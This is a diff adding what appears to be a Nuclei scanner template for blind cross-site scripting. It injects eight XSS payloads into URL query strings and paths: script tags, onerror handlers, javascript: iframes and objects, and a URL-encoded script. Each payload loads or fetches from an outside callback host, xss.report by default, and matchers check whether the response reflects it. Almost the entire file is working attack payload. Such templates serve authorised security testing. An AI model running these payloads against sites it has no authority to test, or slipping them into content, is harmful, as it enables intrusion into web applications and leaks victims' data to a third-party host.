@@ -1,0 +1,73 @@
+id: blind-xss
+
+info:
+  name: Blind Cross Site Scripting
+  author: pdteam,0xKayala
+  severity: high
+  description: |
+    This template will spray blind XSS payloads into URLs. Use 'xss.report', 'bxsshunter.com', 'xsshunter.trufflesecurity.com', 'ez.pe' or 'self-hosted server' to check if the payload fired.
+    Please replace the callback URLs with your own XSS hunter instance or self-hosted server.
+  metadata:
+    max-request: 1
+  tags: xss,blind-xss,dast,bxss,generic
+
+variables:
+  first: "{{rand_int(10000, 99999)}}"
+  callback_domain: "xss.report" # Replace with your domain
+  script_payload_1: "<script src='https://{{callback_domain}}/{{first}}'></script>"
+  script_payload_2: "</script><script src='https://{{callback_domain}}/{{first}}'></script>"
+  script_payload_3: "<script>$.getScript('https://{{callback_domain}}/{{first}}')</script>"
+  script_payload_4: "<img src=x onerror=fetch('https://{{callback_domain}}/{{first}}')>"
+  script_payload_5: "<video><source onerror=fetch('https://{{callback_domain}}/{{first}}')>"
+  script_payload_6: "<iframe src='javascript:fetch(`https://{{callback_domain}}/{{first}}`)'>"
+  script_payload_7: "<object data='javascript:fetch(`https://{{callback_domain}}/{{first}}`)'>"
+  script_payload_8: "%3Cscript%3Efetch%28%27https%3A%2F%2F{{callback_domain}}%2F{{first}}%27%29%3C%2Fscript%3E"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      blind:
+        - "{{script_payload_1}}"
+        - "{{script_payload_2}}"
+        - "{{script_payload_3}}"
+        - "{{script_payload_4}}"
+        - "{{script_payload_5}}"
+        - "{{script_payload_6}}"
+        - "{{script_payload_7}}"
+        - "{{script_payload_8}}"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{blind}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{blind}}"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{script_payload_1}}"
+          - "{{script_payload_2}}"
+          - "{{script_payload_3}}"
+          - "{{script_payload_4}}"
+          - "{{script_payload_5}}"
+          - "{{script_payload_6}}"
+          - "{{script_payload_7}}"
+          - "{{script_payload_8}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html" 
